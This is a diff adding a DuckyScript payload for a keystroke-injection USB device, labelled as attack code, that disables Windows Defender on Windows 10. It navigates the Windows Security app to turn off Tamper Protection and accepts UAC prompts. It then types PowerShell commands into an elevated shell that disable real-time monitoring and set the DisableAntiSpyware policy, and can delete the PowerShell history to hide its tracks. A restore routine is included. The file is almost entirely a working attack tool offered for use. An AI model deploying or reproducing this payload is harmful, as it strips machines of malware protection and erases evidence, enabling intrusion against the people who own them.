@@ -1,0 +1,110 @@
+REM Disable Windows Defender
+REM VERSION 1.1 (Adapted for English Windows 10)
+REM Tested on English Computers (GUI navigation may vary by OS version/updates!)
+REM Uncomment DISABLE_WINDOWS_DEFENDER() or RESTORE() at the end to use it within the Extension or call it later in your Payload.
+
+REM Attack Commands for disabling RTP and Defender with (T)/without(F) clearing or (R) Restore
+DEFINE ATTACK_F Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; exit;
+DEFINE ATTACK_T Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; Remove-Item (Get-PSReadlineOption).HistorySavePath; exit;
+DEFINE ATTACK_R Set-MpPreference -DisableRealtimeMonitoring $false; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0 -PropertyType DWORD -Force; exit;
+DEFINE ATTACK_RC Set-MpPreference -DisableRealtimeMonitoring $false; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0 -PropertyType DWORD -Force; Remove-Item (Get-PSReadlineOption).HistorySavePath; exit;
+
+REM Change the Term for "Windows Security Center" for your Target Language here:
+DEFINE TERM_WIN_SEC_CENTER Windows Security
+REM CLEAN = TRUE deletes PS History, set to FALSE to run Payload without deleting History
+VAR $clean = TRUE
+
+ATTACKMODE HID
+DELAY 2000
+
+FUNCTION DISABLE_WINDOWS_DEFENDER()
+    REM Open Windows Search
+    GUI s
+    DELAY 500
+    REM Type "Windows Security" and press Enter to launch the app
+    STRINGLN TERM_WIN_SEC_CENTER
+    DELAY 500
+    ENTER
+    DELAY 3000 REM Give Windows Security App time to load
+
+    REM --- GUI Navigation to Disable Tamper Protection ---
+    REM WARNING: The exact number of TAB presses may vary significantly
+    REM depending on Windows 10 version, updates, and window size/focus.
+    REM You may need to adjust these DELAYs and TAB counts by testing.
+
+    REM Navigate to "Virus & threat protection" or its settings
+    TAB
+    TAB
+    TAB
+    TAB
+    ENTER
+    DELAY 1000
+
+    REM Navigate within "Virus & threat protection settings" to "Tamper protection"
+    TAB
+    TAB
+    TAB
+    TAB
+    SPACE REM Toggle Tamper Protection OFF
+    DELAY 500
+
+    REM Confirm UAC prompt (usually "Yes" which is ALT+Y in English)
+    ALT y
+    DELAY 1000
+
+    REM Close Windows Security App
+    ALT F4
+    DELAY 1500
+
+    REM ===============================================
+    REM Open Elevated PowerShell and Execute Commands
+    REM ===============================================
+
+    REM Open Quick Link menu (Win+X) and select PowerShell (Admin) or Command Prompt (Admin)
+    GUI x
+    DELAY 100
+    STRING a REM Selects "Windows PowerShell (Admin)" or "Command Prompt (Admin)"
+    DELAY 500
+
+    REM Confirm UAC prompt (usually "Yes" which is ALT+Y in English)
+    ALT y
+    DELAY 1500 REM Wait for elevated shell to open
+
+    REM Execute the predefined attack commands
+    IF ($clean == TRUE) THEN
+      STRINGLN ATTACK_T
+    ELSE 
+      STRINGLN ATTACK_F
+    END_IF
+    DELAY 500 REM Give time for command to execute before the script ends
+
+END_FUNCTION
+
+FUNCTION RESTORE()
+    REM ===============================================
+    REM Open Elevated PowerShell and Execute Commands
+    REM ===============================================
+
+    REM Open Quick Link menu (Win+X) and select PowerShell (Admin) or Command Prompt (Admin)
+    GUI x
+    DELAY 100
+    STRING a REM Selects "Windows PowerShell (Admin)" or "Command Prompt (Admin)"
+    DELAY 500
+
+    REM Confirm UAC prompt (usually "Yes" which is ALT+Y in English)
+    ALT y
+    DELAY 1500 REM Wait for elevated shell to open
+
+    REM Execute the predefined restore commands
+    IF ($clean == TRUE) THEN
+      STRINGLN ATTACK_RC
+    ELSE 
+      STRINGLN ATTACK_R
+    END_IF
+    DELAY 500 REM Give time for command to execute before the script ends
+
+END_FUNCTION
+
+REM Uncomment the Mode you want to use:
+REM DISABLE_WINDOWS_DEFENDER()
+REM RESTORE()
